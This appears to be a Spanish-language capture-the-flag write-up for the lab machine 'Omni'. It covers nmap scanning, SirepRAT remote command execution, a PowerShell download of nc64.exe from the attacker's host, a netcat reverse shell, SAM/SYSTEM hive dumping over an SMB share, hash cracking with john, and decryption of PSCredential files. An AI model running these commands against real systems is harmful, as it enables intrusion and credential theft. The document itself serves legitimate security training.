---
layout: post
author: Sergio Salgado
---

|     Iformation         |      Link          |
|:-----------------------|:-------------------|
| Name                   | Omni               |
| Os                     | Other              |
| Difficulty             | Easy               |
| Points                 | 0                  |
| IP                     | 10.10.10.204       |


## [](#header-2)Reconocimiento

Primero utilizaremos la herramienta que hace la identificación de conexión silenciosa y reconocimiento del sistema al que nos presentamos.

![Scan 1](/assets/images/Omni/scan1.png)

### [](#header-3)NMAP   

El primer escaneo rápido con nmap, para poder agilizar mientras más búsquedas o búsqueda de vulnerabilidades sobre esos puertos.

```s
sudo nmap -p- --open -sS --min-rate 5000 -vvv 10.10.10.204
```

![nmap 1](/assets/images/Omni/nmap1.png)

El segundo escaneo, ya un poco más profundo será:

```s
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.204 -oG allPorts
```

![nmap2](/assets/images/Omni/nmap2.png)

Después de tener los puertos, se puede hacer un escaneo ahora directo a los puertos con:

```s
sudo nmap -sCV -p135,5985,8080,29817,29819,29820 10.10.10.204 -oN targeted
```

![nmap3](/assets/images/Omni/nmap3.png)

Dentro de la cabecera del html de la pagina, vemos que hay un windows content, si buscamos un exploit de este, encontramos una herramienta en <a href="https://github.com/SafeBreach-Labs/SirepRAT.git"> github</a> con la que haremos varias cosillas.

```s
python3 setup.py install

python SirepRAT.py 10.10.10.204 GetFileFromDevice --remote_path "C:\Windows\System32\drivers\etc\hosts" --v
```

![nmap3](/assets/images/Omni/etc_hosts.png)

```s
python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --cmd "C:\Windows\System32\cmd.exe" --args "/c ping 10.10.14.29" --v
```

Escuchamos la traza con:

```s
tcpdump -i tun0 icmp -n
```

```s
python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --cmd "powershell" --args "-c iwr -uri http://10.10.14.29/nc64.exe -OutFile C:\Windows\System32\spool\drivers\color\nc64.exe" --v

#Ejecutamos con
python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --cmd "C:\Windows\System32\cmd.exe" --args "/c C:\Windows\System32\spool\drivers\color\nc64.exe -e cmd 10.10.14.29 4444" --v
```

La flag no se encuentra donde normalmente la buscamos, asi que buscaremos con un:

```s
dir /r /s user.txt
```

La bandera esta ya localizada. Pero esta en formato seguro la flag, asi que lo pasaremos a un formato legible.

```s
reg save HKLM\system system.backup

reg save HKLM\sam sam.backup
```

```s
#No montamos un servidor smb
impacket-smbserver smbfolder $(pwd) -smb2support -username rebick -password rebick123

#En la maquina windows descargamos el archivo con 
net use x: \\10.10.14.29\smbFolder /user:rebick rebick123
```

Podremos ahora listar los archivos en x:\ y copiar directamente los archivos.

Ahora sacaremos en un formato que podremos crackear estos hashes con:

```s
impacket-secretsdump -sam sam -system system LOCAL 
```

El output lo guardamos en un archivo llamado hashes y lo intentaremos crackear 

```s
john --wordlist=/usr/share/wordlists/rockyou.txt hashes --format=NT
```

![Password cracked1](/assets/images/Omni/pass_crack1.png)

Y ahora tenemos acceso a la web app con estas credenciales

![Web app access](/assets/images/Omni/webapp_access.png)

Intentamos ahora meter el comando que ejecuta la reverse shell pero con el usuario app.

![nc for app](/assets/images/Omni/nc_for_app.png)

![Success reverse app](/assets/images/Omni/reverse_success.png)

Ahora si podremos leer la flag si hacemos un

```s
powershell -c "$cred = Import-CliXml -Path root.txt; $cred.getNetworkCredential() | Format-list *" 
```

Con el mismo comando podemos leer las credenciales para admin en el archivo iot-admin.xml y quizas hacer lo mismo desde el navegador.

AHora ya pudimos encontrar directamente la flag de root.

![Root path](/assets/images/Omni/root_path.png)

![Success reverse app](/assets/images/Omni/powned.png)